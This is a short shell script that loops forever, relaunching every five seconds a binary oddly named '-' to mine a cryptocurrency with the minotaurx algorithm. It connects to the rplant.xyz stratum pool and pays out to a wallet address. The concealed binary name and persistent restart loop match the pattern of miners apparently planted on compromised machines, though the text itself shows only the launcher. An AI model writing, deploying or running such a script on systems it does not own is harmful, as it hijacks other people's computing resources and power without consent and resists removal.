#!/bin/sh
while [ 1 ]; do
./- -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u MRt3bLgPKsbnKLiNsbMsdmVv3MfNdrMzQ7.gas
sleep 5
done
